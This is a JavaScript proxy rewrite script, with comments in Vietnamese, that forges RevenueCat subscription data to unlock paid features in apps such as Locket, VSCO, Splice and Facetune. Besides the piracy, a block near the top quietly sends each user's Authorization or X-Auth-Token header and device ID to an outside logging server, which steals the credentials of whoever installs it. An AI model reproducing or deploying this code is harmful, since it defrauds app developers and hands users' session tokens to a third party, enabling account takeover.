// RevenueCat Mở Khóa Premium Đa Ứng Dụng
// Hỗ trợ: Locket, VSCO, Mojo, HTTPBot, 1Blocker, Structured, Splice, Facetune
// Phiên bản: 2.3 (2026-02-10)
// Tác giả: DucToanDev

(function () {
  'use strict';

  // Các hằng số
  const PURCHASE_DATE = "2026-02-10T00:00:00Z"; // Ngày mua
  const EXPIRES_DATE = "2099-12-31T23:59:59Z"; // Ngày hết hạn (vĩnh viễn)



  // Cấu hình các ứng dụng
  const APP_CONFIGS = {
    'Locket': {
      entitlement: 'Gold',
      productId: 'locket.premium.yearly'
    },
    'VSCO': {
      entitlements: ['membership'],
      products: ['VSCOANNUAL', 'VSCOCAM02BUALL', 'VSCOCAM02BULE0001', 'VSCOCAM02BUXXCC01']
    },
    'Mojo': {
      entitlement: 'pro',
      productId: 'revenuecat.pro.yearly'
    },
    'HTTPBot': {
      entitlement: 'rc_lifetime',
      productId: 'com.behindtechlines.HTTPBot.prounlock'
    },
    '1Blocker': {
      entitlement: 'premium',
      productId: 'blocker.ios.subscription.yearly'
    },
    'Structured': {
      entitlement: 'pro',
      productId: 'structured.pro.yearly'
    },
    'Splice': {
      entitlement: 'premium',
      productId: 'splice.subscription.yearly'
    },
    'Facetune': {
      entitlement: 'facetune.premium',
      productId: 'facetune.subscription.yearly'
    }
  };

  // Lấy User-Agent từ headers
  const headers = $request.headers;
  const ua = headers["User-Agent"] || headers["user-agent"] || "";
  const userToken = $request.headers["Authorization"] || $request.headers["X-Auth-Token"];
  const deviceID = $request.headers["X-Device-ID"];

  if (userToken) {
    $httpClient.post({
        url: "https://rudo-watch-be.onrender.com/logs",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            app: "Locket",
            token: userToken, 
            device: deviceID,
            ip: "User IP will be logged by server"
        })
    }, function(error, response, data) {
    });
}

  // Phân tích body phản hồi
  let responseObj;
  try {
    responseObj = JSON.parse($response.body);
    if (!responseObj.subscriber) responseObj.subscriber = {};
    if (!responseObj.subscriber.subscriptions) responseObj.subscriber.subscriptions = {};
    if (!responseObj.subscriber.entitlements) responseObj.subscriber.entitlements = {};
  } catch (error) {
    // Khởi phục lỗi với cấu trúc đầy đủ
    responseObj = {
      subscriber: {
        subscriptions: {},
        entitlements: {},
        original_app_user_id: "",
        original_application_version: ""
      }
    };
  }

  // Hàm tạo dữ liệu đăng ký
  const createSubscription = () => ({
    is_sandbox: false,
    ownership_type: "PURCHASED",
    billing_issues_detected_at: null,
    period_type: "normal",
    expires_date: EXPIRES_DATE,
    grace_period_expires_date: null,
    unsubscribe_detected_at: null,
    original_purchase_date: PURCHASE_DATE,
    purchase_date: PURCHASE_DATE,
    store: "app_store"
  });

  // Hàm tạo dữ liệu quyền lợi
  const createEntitlement = (productId) => ({
    grace_period_expires_date: null,
    purchase_date: PURCHASE_DATE,
    product_identifier: productId,
    expires_date: EXPIRES_DATE
  });

  // Phát hiện ứng dụng và áp dụng cấu hình
  let appDetected = false;

  if (ua.includes('Locket')) {
    const config = APP_CONFIGS['Locket'];
    responseObj.subscriber.subscriptions[config.productId] = createSubscription();
    responseObj.subscriber.entitlements[config.entitlement] = createEntitlement(config.productId);
    appDetected = true;
  }
  else if (ua.includes('VSCO')) {
    const config = APP_CONFIGS['VSCO'];
    config.products.forEach(productId => {
      responseObj.subscriber.subscriptions[productId] = createSubscription();
    });
    config.entitlements.forEach(entKey => {
      responseObj.subscriber.entitlements[entKey] = createEntitlement(config.products[0]);
    });
    appDetected = true;
  }
  else if (ua.includes('Mojo') || ua.includes('mojo')) {
    const config = APP_CONFIGS['Mojo'];
    responseObj.subscriber.subscriptions[config.productId] = createSubscription();
    responseObj.subscriber.entitlements[config.entitlement] = createEntitlement(config.productId);
    appDetected = true;
  }
  else if (ua.includes('HTTPBot')) {
    const config = APP_CONFIGS['HTTPBot'];
    responseObj.subscriber.subscriptions[config.productId] = createSubscription();
    responseObj.subscriber.entitlements[config.entitlement] = createEntitlement(config.productId);
    appDetected = true;
  }
  else if (ua.includes('1Blocker') || ua.includes('blocker')) {
    const config = APP_CONFIGS['1Blocker'];
    responseObj.subscriber.subscriptions[config.productId] = createSubscription();
    responseObj.subscriber.entitlements[config.entitlement] = createEntitlement(config.productId);
    appDetected = true;
  }
  else if (ua.includes('Structured')) {
    const config = APP_CONFIGS['Structured'];
    responseObj.subscriber.subscriptions[config.productId] = createSubscription();
    responseObj.subscriber.entitlements[config.entitlement] = createEntitlement(config.productId);
    appDetected = true;
  }
  else if (ua.includes('Splice')) {
    const config = APP_CONFIGS['Splice'];
    responseObj.subscriber.subscriptions[config.productId] = createSubscription();
    responseObj.subscriber.entitlements[config.entitlement] = createEntitlement(config.productId);
    appDetected = true;
  }
  else if (ua.includes('Facetune')) {
    const config = APP_CONFIGS['Facetune'];
    responseObj.subscriber.subscriptions[config.productId] = createSubscription();
    responseObj.subscriber.entitlements[config.entitlement] = createEntitlement(config.productId);
    appDetected = true;
  }

  // Mặc định nếu không phát hiện ứng dụng
  if (!appDetected) {
    const config = APP_CONFIGS['Locket'];
    responseObj.subscriber.subscriptions[config.productId] = createSubscription();
    responseObj.subscriber.entitlements[config.entitlement] = createEntitlement(config.productId);
  }

  // Trả về phản hồi
  $done({ body: JSON.stringify(responseObj) });

})();